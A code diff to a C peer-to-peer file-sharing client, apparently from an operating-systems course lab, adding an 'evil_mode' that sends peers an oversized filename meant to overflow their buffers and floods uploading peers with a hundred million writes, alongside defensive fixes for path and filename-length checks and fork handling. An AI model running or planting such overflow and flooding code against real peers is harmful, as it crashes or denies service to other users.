@@ -540,7 +540,26 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	
+	if(evil_mode == 0)
+	{
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
+	else
+	{
+		char filename[FILENAMESIZ * 10];
+		
+		int i;
+		for(i = 0; i < (FILENAMESIZ * 10) - 2; i += 2)
+		{
+			filename[i] = ':';
+			filename[i+1] = 'D';
+		}
+		
+		filename[(FILENAMESIZ * 10) - 1] = '\0';
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", filename);
+		message("Attack Succesfull\n");
+	}
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -662,7 +681,31 @@ static void task_upload(task_t *t)
 			   || (t->tail && t->buf[t->tail-1] == '\n'))
 			break;
 	}
-
+	
+	if(evil_mode != 0)
+	{
+		int fd[2];
+		
+		if(pipe(fd) == 0)
+		{
+			int i;
+			
+			for(i = 0; i < 100000000; i++)
+			{
+				write(fd[1], ":D", 2);
+		  		read_to_taskbuf(fd[0], t);
+		  		write_from_taskbuf(t->peer_fd, t);
+			}
+			
+			message("Attack sent");
+			goto exit;
+		}
+		else
+		{
+			error("Upload attack was unsuccesful :(");
+		}
+	}
+ 
 	assert(t->head == 0);
 	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
@@ -671,7 +714,7 @@ static void task_upload(task_t *t)
 
 	//Must stay in the current directory
 
-	if(strstr(t->filename, "/"\) != NULL) {
+	if(strstr(t->filename, "/") != NULL) {
 		error("Cannot serve files outside of this directory\n");
 		goto exit;
 	}
@@ -681,6 +724,7 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 
+	size_t nameLen = strlen(t->filename);
 	//check the filename size
 	if (nameLen > FILENAMESIZ) {
 		error("Filename too long\n");
@@ -810,6 +854,14 @@ int main(int argc, char *argv[])
 				task_download(t, tracker_task);
 				exit(0);
 			}
+			else if (pid < 0)
+			{
+				error("Error: could not fork\n");
+			}
+			else
+			{
+				task_free(t);
+			}
 		}
 
 	int status;
@@ -830,6 +882,14 @@ int main(int argc, char *argv[])
 		{
 			task_upload(t);
 			exit(0);
+		}
+		else if (pid < 0)
+		{
+			error("Error: could not fork\n");
+		}
+		else
+		{
+			task_free(t);
 		}
 	}
 
